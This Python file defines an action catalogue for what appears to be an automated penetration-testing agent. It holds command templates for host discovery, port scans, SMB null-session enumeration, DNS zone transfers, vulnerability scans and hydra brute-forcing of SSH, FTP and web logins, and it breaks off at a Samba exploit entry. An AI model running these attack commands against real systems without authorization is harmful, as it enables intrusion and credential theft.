import re

# 000-099  Control
# 100-199  Local attacker context
# 200-299  Recon / discovery / scan
# 300-399  Enumeration
# 400-499  Vulnerability discovery / validation
# 500-599  Credential attacks
# 600-699  Exploitation
# 700-799  Post-exploitation

# action_id -> (name, command)
ACTIONS = {
    # ============================================================
    # 000-099 CONTROL
    # ============================================================

    0: {
        "name": "STOP",
        "category": "control",
        "phase": "stop",
        "tool": None,
        "command_template": None,
        "placeholders": [],
        "parser_family": None,
        "expected_events": ["SESSION_STOPPED"],
        "description": "Stop the session.",
    },

    1: {
        "name": "NO_OP",
        "category": "control",
        "phase": "control",
        "tool": None,
        "command_template": None,
        "placeholders": [],
        "parser_family": None,
        "expected_events": ["NO_ACTION"],
        "preconditions": {},
        "risk_level": "safe",
        "description": "Do nothing in the current step.",
    },

    # Windows
    # 1: {
    #     "name": "INSPECT_IPCONFIG",
    #     "category": "local_inspection",
    #     "phase": "attacker_context",
    #     "tool": "ipconfig",
    #     "command_template": "ipconfig /all",
    #     "placeholders": [],
    #     "parser_family": "windows_ipconfig",
    #     "expected_events": ["NET_INFO"],
    #     "description": "Inspect local Windows network interfaces.",
    # },
    # # 1: ("INSPECT_IPCONFIG", "ipconfig /all"),
    # 2: ("INSPECT_ARP", "arp -a"),
    # 3: ("INSPECT_ROUTE", "route print"),
    # # : ("INSPECT_NETSTAT", "netstat -ano"),
    # 4: ("PING_FOCUS_HOST", "ping -n 1 {ip}"),

    # ============================================================
    # 100-199 LOCAL ATTACKER CONTEXT
    # ============================================================
    100: {
        "name": "INSPECT_LOCAL_HOSTNAME",
        "category": "local_inspection",
        "phase": "attacker_context",
        "tool": "hostname",
        "command_template": "hostname",
        "placeholders": [],
        "parser_family": "generic_text",
        "expected_events": ["LOCAL_HOSTNAME_DETECTED"],
        "preconditions": {},
        "risk_level": "safe",
        "description": "Inspect local attacker hostname.",
    },
    101: {
        "name": "INSPECT_IP_A",
        "category": "local_inspection",
        "phase": "attacker_context",
        "tool": "ip",
        "command_template": "ip a",
        "placeholders": [],
        "parser_family": "linux_ip_addr",
        "expected_events": ["NET_INFO"],
        "description": "Inspect local Linux network interfaces.",
    },
    # 101: ("INSPECT_IP_A", "ip a"),
    102: {
        "name": "INSPECT_IP_R",
        "category": "local_inspection",
        "phase": "attacker_context",
        "tool": "ip",
        "command_template": "ip r",
        "placeholders": [],
        "parser_family": "linux_ip_route",
        "expected_events": ["ROUTE_TABLE"],
        "description": "Inspect local Linux routing table.",
    },
    # 102: ("INSPECT_IP_R", "ip r"),
    103: {
        "name": "INSPECT_IP_NEIGH",
        "category": "local_inspection",
        "phase": "attacker_context",
        "tool": "ip",
        "command_template": "ip neigh",
        "placeholders": [],
        "parser_family": "linux_ip_neigh",
        "expected_events": ["ARP_TABLE"],
        "description": "Inspect local Linux ARP table.",
    },
    104: {
        "name": "INSPECT_SS_LISTENERS",
        "category": "local_inspection",
        "phase": "attacker_context",
        "tool": "ss",
        "command_template": "ss -tulpn",
        "placeholders": [],
        "parser_family": "linux_ss",
        "expected_events": ["PORT_LISTENER_DETECTED"],
        "preconditions": {},
        "risk_level": "safe",
        "description": "Inspect local listening TCP/UDP sockets.",
    },
    105: {
        "name": "PING_FOCUS_HOST",
        "category": "local_inspection",
        "phase": "attacker_context",
        "tool": "ping",
        "command_template": "ping -c 1 -W 2 {target_ip}",
        "placeholders": ["target_ip"],
        "parser_family": "generic_ping",
        "expected_events": ["PING_RESPONSE"],
        "preconditions": {
            "requires_target_ip": True,
        },
        "risk_level": "safe",
        "description": "Ping the focused host once.",
    },

    106: {
        "name": "TRACE_ROUTE_TO_HOST",
        "category": "local_inspection",
        "phase": "attacker_context",
        "tool": "traceroute",
        "command_template": "traceroute {target_ip}",
        "placeholders": ["target_ip"],
        "parser_family": "traceroute",
        "expected_events": ["ROUTE_HOP_DETECTED"],
        "preconditions": {
            "requires_target_ip": True,
        },
        "risk_level": "safe",
        "description": "Trace network path to the focused host.",
    },

    # ============================================================
    # 200-299 RECON / DISCOVERY / PORT SCANNING
    # ============================================================
    200: {
        "name": "DISCOVER_HOSTS",
        "category": "recon",
        "phase": "host_discovery",
        "tool": "nmap",
        "command_template": "nmap -sn {target}",
        "placeholders": ["target"],
        "parser_family": "nmap_host_discovery",
        "expected_events": ["HOST_DISCOVERED"],
        "description": "Discover alive hosts in the target network.",
    },
    # 200: ("DISCOVER_HOSTS", "nmap -sn {target}"),
     201: {
        "name": "DISCOVER_HOSTS_ARP_LOCALNET",
        "category": "recon",
        "phase": "host_discovery",
        "tool": "arp-scan",
        "command_template": "arp-scan --localnet",
        "placeholders": [],
        "parser_family": "arp_scan",
        "expected_events": ["HOST_DISCOVERED"],
        "preconditions": {},
        "risk_level": "safe",
        "description": "Discover local network hosts using ARP scan.",
    },

    202: {
        "name": "DISCOVER_HOSTS_ARP_RANGE",
        "category": "recon",
        "phase": "host_discovery",
        "tool": "arp-scan",
        "command_template": "arp-scan {target}",
        "placeholders": ["target"],
        "parser_family": "arp_scan",
        "expected_events": ["HOST_DISCOVERED"],
        "preconditions": {
            "requires_target": True,
        },
        "risk_level": "safe",
        "description": "Discover hosts in a target range using ARP scan.",
    },

    203: {
        "name": "DISCOVER_HOSTS_NETDISCOVER",
        "category": "recon",
        "phase": "host_discovery",
        "tool": "netdiscover",
        "command_template": "netdiscover -r {target}",
        "placeholders": ["target"],
        "parser_family": "netdiscover",
        "expected_events": ["HOST_DISCOVERED"],
        "preconditions": {
            "requires_target": True,
        },
        "risk_level": "safe",
        "description": "Discover hosts using netdiscover.",
    },

    204: {
        "name": "DISCOVER_HOSTS_FPING",
        "category": "recon",
        "phase": "host_discovery",
        "tool": "fping",
        "command_template": "fping -a -g {target} 2>/dev/null",
        "placeholders": ["target"],
        "parser_family": "fping",
        "expected_events": ["HOST_DISCOVERED"],
        "preconditions": {
            "requires_target": True,
        },
        "risk_level": "safe",
        "description": "Discover alive hosts using fping sweep.",
    },

    210: {
        "name": "SCAN_TOP_TCP_PORTS",
        "category": "recon",
        "phase": "portscan",
        "tool": "nmap",
        "command_template": "nmap --top-ports 1000 --open -T3 {target_ip}",
        "placeholders": ["target_ip"],
        "parser_family": "nmap_portscan",
        "expected_events": ["PORT_OPEN"],
        "preconditions": {
            "requires_target_ip": True,
        },
        "description": "Scan common TCP ports on the focused host.",
    },
    # 210: ("SCAN_TOP_TCP_PORTS", "nmap --top-ports 1000 --open -T3 {target_ip}"),
    
    211: {
        "name": "SCAN_FULL_TCP_PORTS",
        "category": "recon",
        "phase": "portscan",
        "tool": "nmap",
        "command_template": "nmap -p- --open -T3 {target_ip}",
        "placeholders": ["target_ip"],
        "parser_family": "nmap_portscan",
        "expected_events": ["PORT_OPEN"],
        "preconditions": {
            "requires_target_ip": True,
        },
        "description": "Scan all TCP ports on the focused host.",
    },
    
    212: {
        "name": "SCAN_QUICK_TCP_PORTS",
        "category": "recon",
        "phase": "portscan",
        "tool": "nmap",
        "command_template": "nmap -F --open -T3 {target_ip}",
        "placeholders": ["target_ip"],
        "parser_family": "nmap_portscan",
        "expected_events": ["PORT_OPEN"],
        "preconditions": {
            "requires_target_ip": True,
        },
        "risk_level": "low",
        "description": "Run a fast TCP port scan.",
    },

    213: {
        "name": "SCAN_TOP_UDP_PORTS",
        "category": "recon",
        "phase": "portscan",
        "tool": "nmap",
        "command_template": "nmap -sU --top-ports 100 -T3 {target_ip}",
        "placeholders": ["target_ip"],
        "parser_family": "nmap_portscan",
        "expected_events": ["PORT_OPEN"],
        "preconditions": {
            "requires_target_ip": True,
        },
        "risk_level": "medium",
        "description": "Scan common UDP ports on the focused host.",
    },

    220: {
        "name": "DETECT_SERVICES",
        "category": "recon",
        "phase": "service_detection",
        "tool": "nmap",
        "command_template": "nmap -sV -sC -O -T3 -p {known_open_ports_csv} {target_ip}",
        "placeholders": ["known_open_ports_csv", "target_ip"],
        "parser_family": "nmap_service_detection",
        "expected_events": [
            "SERVICE_DETECTED",
            "SERVICE_VERSION_DETECTED",
            "OS_GUESS_DETECTED",
            "SCRIPT_RESULT",
        ],
        "preconditions": {
            "requires_target_ip": True,
            "requires_known_open_ports": True,
        },
        "risk_level": "low",
        "description": "Detect service names, versions, default script output and OS hints.",
    },

    221: {
        "name": "DETECT_SERVICES_LIGHT",
        "category": "recon",
        "phase": "service_detection",
        "tool": "nmap",
        "command_template": "nmap -sV --version-light -p {known_open_ports_csv} {target_ip}",
        "placeholders": ["known_open_ports_csv", "target_ip"],
        "parser_family": "nmap_service_detection",
        "expected_events": ["SERVICE_DETECTED", "SERVICE_VERSION_DETECTED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_known_open_ports": True,
        },
        "risk_level": "low",
        "description": "Run light service version detection.",
    },

    222: {
        "name": "DETECT_SERVICES_AGGRESSIVE",
        "category": "recon",
        "phase": "service_detection",
        "tool": "nmap",
        "command_template": "nmap -A -T3 -p {known_open_ports_csv} {target_ip}",
        "placeholders": ["known_open_ports_csv", "target_ip"],
        "parser_family": "nmap_service_detection",
        "expected_events": [
            "SERVICE_DETECTED",
            "SERVICE_VERSION_DETECTED",
            "OS_GUESS_DETECTED",
            "SCRIPT_RESULT",
        ],
        "preconditions": {
            "requires_target_ip": True,
            "requires_known_open_ports": True,
        },
        "risk_level": "medium",
        "description": "Run aggressive Nmap service, OS and default script detection.",
    },

    230: {
        "name": "ENUM_NMAP_DEFAULT_SCRIPTS",
        "category": "enumeration",
        "phase": "general_enum",
        "tool": "nmap",
        "command_template": "nmap -sC -p {known_open_ports_csv} {target_ip}",
        "placeholders": ["known_open_ports_csv", "target_ip"],
        "parser_family": "nmap_scripts",
        "expected_events": ["SCRIPT_RESULT"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_known_open_ports": True,
        },
        "risk_level": "low",
        "description": "Run Nmap default NSE scripts on known open ports.",
    },

    # ============================================================
    # 300-399 SERVICE ENUMERATION
    # ============================================================
    300: {
        "name": "ENUM_HTTP_HEADERS",
        "category": "enumeration",
        "phase": "http_enum",
        "tool": "curl",
        "command_template": "curl -I --max-time 10 http://{target_ip}:{target_port}",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "curl_http_headers",
        "expected_events": ["HTTP_HEADER_DETECTED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["http"],
        },
        "risk_level": "safe",
        "description": "Enumerate HTTP response headers.",
    },

    301: {
        "name": "ENUM_HTTP_INDEX",
        "category": "enumeration",
        "phase": "http_enum",
        "tool": "curl",
        "command_template": "curl -L --max-time 10 http://{target_ip}:{target_port}",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "curl_http_body",
        "expected_events": ["HTTP_TITLE_DETECTED", "HTTP_BODY_HINT_DETECTED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["http"],
        },
        "risk_level": "safe",
        "description": "Fetch HTTP index page and extract basic hints.",
    },

    302: {
        "name": "ENUM_HTTPS_HEADERS",
        "category": "enumeration",
        "phase": "http_enum",
        "tool": "curl",
        "command_template": "curl -k -I --max-time 10 https://{target_ip}:{target_port}",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "curl_http_headers",
        "expected_events": ["HTTP_HEADER_DETECTED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["https"],
        },
        "risk_level": "safe",
        "description": "Enumerate HTTPS response headers.",
    },

    303: {
        "name": "ENUM_HTTP_ROBOTS",
        "category": "enumeration",
        "phase": "http_enum",
        "tool": "curl",
        "command_template": "curl -L --max-time 10 http://{target_ip}:{target_port}/robots.txt",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "curl_robots",
        "expected_events": ["ROBOTS_TXT_FOUND", "WEB_PATH_FOUND"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["http"],
        },
        "risk_level": "safe",
        "description": "Fetch robots.txt from HTTP service.",
    },

    310: {
        "name": "ENUM_HTTP_DIRS_GOBUSTER",
        "category": "enumeration",
        "phase": "http_enum",
        "tool": "gobuster",
        "command_template": "gobuster dir -u http://{target_ip}:{target_port} -w /usr/share/wordlists/dirb/common.txt -q",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "gobuster_dir",
        "expected_events": ["WEB_PATH_FOUND"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["http"],
        },
        "risk_level": "low",
        "description": "Discover common HTTP paths using gobuster.",
    },

    311: {
        "name": "ENUM_HTTP_DIRS_FEROXBUSTER",
        "category": "enumeration",
        "phase": "http_enum",
        "tool": "feroxbuster",
        "command_template": "feroxbuster -u http://{target_ip}:{target_port} -w /usr/share/wordlists/dirb/common.txt -q",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "feroxbuster",
        "expected_events": ["WEB_PATH_FOUND"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["http"],
        },
        "risk_level": "low",
        "description": "Discover common HTTP paths using feroxbuster.",
    },

    312: {
        "name": "ENUM_HTTP_NIKTO",
        "category": "enumeration",
        "phase": "http_enum",
        "tool": "nikto",
        "command_template": "nikto -h http://{target_ip}:{target_port}",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "nikto",
        "expected_events": ["WEB_FINDING_FOUND", "CANDIDATE_VULN_FOUND"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["http"],
        },
        "risk_level": "low",
        "description": "Run basic Nikto checks against HTTP service.",
    },

    313: {
        "name": "ENUM_HTTP_TECHNOLOGIES",
        "category": "enumeration",
        "phase": "http_enum",
        "tool": "whatweb",
        "command_template": "whatweb http://{target_ip}:{target_port}",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "whatweb",
        "expected_events": ["WEB_TECH_DETECTED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["http", "https"],
        },
        "risk_level": "safe",
        "description": "Fingerprint web technologies.",
    },

    314: {
        "name": "ENUM_HTTP_WAF",
        "category": "enumeration",
        "phase": "http_enum",
        "tool": "wafw00f",
        "command_template": "wafw00f http://{target_ip}:{target_port}",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "wafw00f",
        "expected_events": ["WAF_DETECTED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["http", "https"],
        },
        "risk_level": "safe",
        "description": "Detect possible web application firewall.",
    },

    # -------------------------
    # SMB
    # -------------------------

    320: {
        "name": "ENUM_SMB_SHARES",
        "category": "enumeration",
        "phase": "smb_enum",
        "tool": "smbclient",
        "command_template": "smbclient -L //{target_ip} -N",
        "placeholders": ["target_ip"],
        "parser_family": "smbclient_shares",
        "expected_events": ["SMB_SHARE_FOUND"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_service": ["smb", "microsoft-ds", "netbios-ssn"],
        },
        "risk_level": "safe",
        "description": "Enumerate SMB shares anonymously.",
    },

    321: {
        "name": "ENUM_SMB_BASIC_ENUM4LINUX",
        "category": "enumeration",
        "phase": "smb_enum",
        "tool": "enum4linux",
        "command_template": "enum4linux -a {target_ip}",
        "placeholders": ["target_ip"],
        "parser_family": "enum4linux",
        "expected_events": ["SMB_USER_FOUND", "SMB_SHARE_FOUND", "SMB_GROUP_FOUND"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_service": ["smb", "microsoft-ds", "netbios-ssn"],
        },
        "risk_level": "low",
        "description": "Run basic SMB enumeration using enum4linux.",
    },

    322: {
        "name": "ENUM_SMB_NULL_SESSION_USERS",
        "category": "enumeration",
        "phase": "smb_enum",
        "tool": "rpcclient",
        "command_template": "rpcclient -U '' -N {target_ip} -c enumdomusers",
        "placeholders": ["target_ip"],
        "parser_family": "rpcclient",
        "expected_events": ["SMB_USER_FOUND"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_service": ["smb", "microsoft-ds", "netbios-ssn"],
        },
        "risk_level": "low",
        "description": "Attempt anonymous SMB user enumeration through rpcclient.",
    },

    323: {
        "name": "ENUM_SMB_OS_DISCOVERY",
        "category": "enumeration",
        "phase": "smb_enum",
        "tool": "nmap",
        "command_template": "nmap -p 445 --script smb-os-discovery {target_ip}",
        "placeholders": ["target_ip"],
        "parser_family": "nmap_smb",
        "expected_events": ["OS_GUESS_DETECTED", "SMB_INFO_DETECTED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_service": ["smb", "microsoft-ds"],
        },
        "risk_level": "safe",
        "description": "Discover SMB OS information using Nmap NSE.",
    },

    324: {
        "name": "ENUM_SMB_PROTOCOLS",
        "category": "enumeration",
        "phase": "smb_enum",
        "tool": "nmap",
        "command_template": "nmap -p 445 --script smb-protocols {target_ip}",
        "placeholders": ["target_ip"],
        "parser_family": "nmap_smb",
        "expected_events": ["SMB_PROTOCOL_DETECTED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_service": ["smb", "microsoft-ds"],
        },
        "risk_level": "safe",
        "description": "Enumerate supported SMB protocol versions.",
    },

    # -------------------------
    # FTP
    # -------------------------

    330: {
        "name": "ENUM_FTP_BANNER",
        "category": "enumeration",
        "phase": "ftp_enum",
        "tool": "nc",
        "command_template": "nc -nv -w 5 {target_ip} {target_port}",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "generic_banner",
        "expected_events": ["SERVICE_BANNER_DETECTED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["ftp"],
        },
        "risk_level": "safe",
        "description": "Grab FTP banner.",
    },

    331: {
        "name": "ENUM_FTP_ANONYMOUS",
        "category": "enumeration",
        "phase": "ftp_enum",
        "tool": "nmap",
        "command_template": "nmap --script ftp-anon -p {target_port} {target_ip}",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "nmap_ftp_anon",
        "expected_events": ["FTP_ANON_LOGIN_ALLOWED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["ftp"],
        },
        "risk_level": "safe",
        "description": "Check anonymous FTP access.",
    },

    332: {
        "name": "ENUM_FTP_NMAP_SCRIPTS",
        "category": "enumeration",
        "phase": "ftp_enum",
        "tool": "nmap",
        "command_template": "nmap -p {target_port} --script ftp-* {target_ip}",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "nmap_ftp",
        "expected_events": ["FTP_INFO_DETECTED", "SCRIPT_RESULT"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["ftp"],
        },
        "risk_level": "low",
        "description": "Run FTP-related Nmap scripts.",
    },

    # -------------------------
    # SSH
    # -------------------------

    340: {
        "name": "ENUM_SSH_BANNER",
        "category": "enumeration",
        "phase": "ssh_enum",
        "tool": "nc",
        "command_template": "nc -nv -w 5 {target_ip} {target_port}",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "generic_banner",
        "expected_events": ["SERVICE_BANNER_DETECTED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["ssh"],
        },
        "risk_level": "safe",
        "description": "Grab SSH banner.",
    },

    341: {
        "name": "ENUM_SSH_NMAP_SCRIPTS",
        "category": "enumeration",
        "phase": "ssh_enum",
        "tool": "nmap",
        "command_template": "nmap -p {target_port} --script ssh2-enum-algos,ssh-hostkey {target_ip}",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "nmap_ssh",
        "expected_events": ["SSH_INFO_DETECTED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["ssh"],
        },
        "risk_level": "safe",
        "description": "Enumerate SSH algorithms and host keys.",
    },

    # -------------------------
    # DNS
    # -------------------------

    350: {
        "name": "ENUM_DNS_VERSION_BIND",
        "category": "enumeration",
        "phase": "dns_enum",
        "tool": "dig",
        "command_template": "dig @{target_ip} version.bind chaos txt",
        "placeholders": ["target_ip"],
        "parser_family": "dig",
        "expected_events": ["DNS_INFO_DETECTED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_service": ["dns", "domain"],
        },
        "risk_level": "safe",
        "description": "Query DNS version.bind information.",
    },

    351: {
        "name": "ENUM_DNS_ANY",
        "category": "enumeration",
        "phase": "dns_enum",
        "tool": "dig",
        "command_template": "dig @{target_ip} {target_domain} any",
        "placeholders": ["target_ip", "target_domain"],
        "parser_family": "dig",
        "expected_events": ["DNS_RECORD_FOUND"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_domain": True,
            "requires_service": ["dns", "domain"],
        },
        "risk_level": "safe",
        "description": "Query DNS ANY records for a known domain.",
    },

    352: {
        "name": "ENUM_DNS_ZONE_TRANSFER",
        "category": "enumeration",
        "phase": "dns_enum",
        "tool": "dig",
        "command_template": "dig axfr @{target_ip} {target_domain}",
        "placeholders": ["target_ip", "target_domain"],
        "parser_family": "dig_axfr",
        "expected_events": ["DNS_ZONE_TRANSFER_ALLOWED", "DNS_RECORD_FOUND"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_domain": True,
            "requires_service": ["dns", "domain"],
        },
        "risk_level": "low",
        "description": "Attempt DNS zone transfer in authorized lab.",
    },

     # -------------------------
    # Databases
    # -------------------------

    370: {
        "name": "ENUM_MYSQL_INFO",
        "category": "enumeration",
        "phase": "db_enum",
        "tool": "nmap",
        "command_template": "nmap -p {target_port} --script mysql-info {target_ip}",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "nmap_mysql",
        "expected_events": ["DB_INFO_DETECTED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["mysql"],
        },
        "risk_level": "safe",
        "description": "Enumerate MySQL service information.",
    },

    371: {
        "name": "ENUM_POSTGRES_INFO",
        "category": "enumeration",
        "phase": "db_enum",
        "tool": "nmap",
        "command_template": "nmap -p {target_port} --script pgsql-brute --script-args brute.mode=creds {target_ip}",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "nmap_postgres",
        "expected_events": ["DB_INFO_DETECTED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["postgresql"],
        },
        "risk_level": "low",
        "description": "Run basic PostgreSQL NSE enumeration in lab context.",
    },

    # -------------------------
    # RDP / VNC
    # -------------------------

    380: {
        "name": "ENUM_RDP_INFO",
        "category": "enumeration",
        "phase": "rdp_enum",
        "tool": "nmap",
        "command_template": "nmap -p {target_port} --script rdp-enum-encryption,rdp-ntlm-info {target_ip}",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "nmap_rdp",
        "expected_events": ["RDP_INFO_DETECTED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["ms-wbt-server", "rdp"],
        },
        "risk_level": "safe",
        "description": "Enumerate RDP encryption and NTLM information.",
    },

    381: {
        "name": "ENUM_VNC_INFO",
        "category": "enumeration",
        "phase": "vnc_enum",
        "tool": "nmap",
        "command_template": "nmap -p {target_port} --script vnc-info {target_ip}",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "nmap_vnc",
        "expected_events": ["VNC_INFO_DETECTED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["vnc"],
        },
        "risk_level": "safe",
        "description": "Enumerate VNC information.",
    },

    # ============================================================
    # 400-499 VULNERABILITY DISCOVERY
    # ============================================================

    400: {
        "name": "CHECK_SERVICE_VERSION_VULNS",
        "category": "vulnerability_discovery",
        "phase": "vuln_lookup",
        "tool": "searchsploit",
        "command_template": "searchsploit {service_version_string}",
        "placeholders": ["service_version_string"],
        "parser_family": "searchsploit",
        "expected_events": ["CANDIDATE_VULN_FOUND"],
        "preconditions": {
            "requires_service_version_string": True,
        },
        "risk_level": "safe",
        "description": "Search public exploit references for detected service versions.",
    },

    401: {
        "name": "CHECK_NMAP_VULN_SCRIPTS",
        "category": "vulnerability_discovery",
        "phase": "vuln_lookup",
        "tool": "nmap",
        "command_template": "nmap --script vuln -p {known_open_ports_csv} {target_ip}",
        "placeholders": ["known_open_ports_csv", "target_ip"],
        "parser_family": "nmap_vuln_scripts",
        "expected_events": ["CANDIDATE_VULN_FOUND", "VULN_SCRIPT_RESULT"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_known_open_ports": True,
        },
        "risk_level": "medium",
        "description": "Run Nmap vulnerability scripts against known open ports.",
    },

    410: {
        "name": "CHECK_NMAP_VULN_SCRIPTS",
        "category": "vulnerability_discovery",
        "phase": "vuln_lookup",
        "tool": "nmap",
        "command_template": "nmap --script vuln -p {known_open_ports_csv} {target_ip}",
        "placeholders": ["target_ip", "known_open_ports_csv"],
        "parser_family": "nmap_vuln_scripts",
        "expected_events": ["CANDIDATE_VULN_FOUND", "VULN_SCRIPT_RESULT"],
        "description": "Run Nmap vulnerability scripts against known open ports.",
    },
    # 400: ("CHECK_SERVICE_VERSION_VULNS", "searchsploit {service_version_string}"),
    410: {
        "name": "CHECK_SMB_VULNS",
        "category": "vulnerability_discovery",
        "phase": "vuln_lookup",
        "tool": "nmap",
        "command_template": "nmap -p 445 --script smb-vuln* {target_ip}",
        "placeholders": ["target_ip"],
        "parser_family": "nmap_smb_vuln",
        "expected_events": ["CANDIDATE_VULN_FOUND", "VULN_SCRIPT_RESULT"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_service": ["smb", "microsoft-ds"],
        },
        "risk_level": "medium",
        "description": "Run SMB vulnerability NSE scripts.",
    },

    411: {
        "name": "CHECK_HTTP_VULNS_NIKTO",
        "category": "vulnerability_discovery",
        "phase": "vuln_lookup",
        "tool": "nikto",
        "command_template": "nikto -h http://{target_ip}:{target_port}",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "nikto",
        "expected_events": ["WEB_FINDING_FOUND", "CANDIDATE_VULN_FOUND"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["http"],
        },
        "risk_level": "low",
        "description": "Check common HTTP vulnerabilities using Nikto.",
    },

    412: {
        "name": "CHECK_SSL_TLS_CIPHERS",
        "category": "vulnerability_discovery",
        "phase": "vuln_lookup",
        "tool": "nmap",
        "command_template": "nmap -p {target_port} --script ssl-enum-ciphers {target_ip}",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "nmap_ssl",
        "expected_events": ["TLS_INFO_DETECTED", "TLS_WEAKNESS_DETECTED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["ssl", "https"],
        },
        "risk_level": "safe",
        "description": "Enumerate TLS configuration and weak ciphers.",
    },

    413: {
        "name": "CHECK_FTP_VULNS",
        "category": "vulnerability_discovery",
        "phase": "vuln_lookup",
        "tool": "nmap",
        "command_template": "nmap -p {target_port} --script ftp-vsftpd-backdoor,ftp-anon {target_ip}",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "nmap_ftp_vuln",
        "expected_events": ["CANDIDATE_VULN_FOUND", "FTP_ANON_LOGIN_ALLOWED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["ftp"],
        },
        "risk_level": "low",
        "description": "Check common FTP issues in lab context.",
    },

    # ============================================================
    # 500-599 CREDENTIAL ATTACKS / AUTH CHECKS
    # ============================================================
    500: {
        "name": "BRUTEFORCE_SSH",
        "category": "credential_attack",
        "phase": "credential_attack",
        "tool": "hydra",
        "command_template": "hydra -L {userlist_path} -P {passwordlist_path} ssh://{target_ip}",
        "placeholders": ["target_ip", "userlist_path", "passwordlist_path"],
        "parser_family": "hydra",
        "expected_events": ["VALID_CREDENTIAL_FOUND", "LOGIN_FAILED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_service": ["ssh"],
            "requires_authorization": True,
        },
        "risk_level": "high",
        "description": "Run SSH credential testing in an authorized lab.",
    },

    501: {
        "name": "BRUTEFORCE_FTP",
        "category": "credential_attack",
        "phase": "credential_attack",
        "tool": "hydra",
        "command_template": "hydra -L {userlist_path} -P {passwordlist_path} ftp://{target_ip}",
        "placeholders": ["target_ip", "userlist_path", "passwordlist_path"],
        "parser_family": "hydra",
        "expected_events": ["VALID_CREDENTIAL_FOUND", "LOGIN_FAILED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_service": ["ftp"],
            "requires_authorization": True,
        },
        "risk_level": "high",
        "description": "Run FTP credential testing in an authorized lab.",
    },

    502: {
        "name": "BRUTEFORCE_HTTP_LOGIN",
        "category": "credential_attack",
        "phase": "credential_attack",
        "tool": "hydra",
        "command_template": "hydra -L {userlist_path} -P {passwordlist_path} {target_ip} http-post-form \"{login_path}:{login_user_field}=^USER^&{login_pass_field}=^PASS^:{login_failure_string}\"",
        "placeholders": [
            "target_ip",
            "userlist_path",
            "passwordlist_path",
            "login_path",
            "login_user_field",
            "login_pass_field",
            "login_failure_string",
        ],
        "parser_family": "hydra_http",
        "expected_events": ["VALID_CREDENTIAL_FOUND", "LOGIN_FAILED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_http_login_form": True,
            "requires_authorization": True,
        },
        "risk_level": "high",
        "description": "Run HTTP form credential testing when login form parameters are known.",
    },

    510: {
        "name": "CHECK_FTP_ANONYMOUS_LOGIN",
        "category": "credential_attack",
        "phase": "credential_attack",
        "tool": "nmap",
        "command_template": "nmap --script ftp-anon -p {target_port} {target_ip}",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "nmap_ftp_anon",
        "expected_events": ["FTP_ANON_LOGIN_ALLOWED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["ftp"],
        },
        "risk_level": "low",
        "description": "Check whether anonymous FTP login is allowed.",
    },

    # ============================================================
    # 600-699 EXPLOITATION CONTROLADA EN LABORATORIO
    # ============================================================

    600: {
        "name": "MSF_EXPLOIT_SAMBA_USERMAP_SCRIPT",
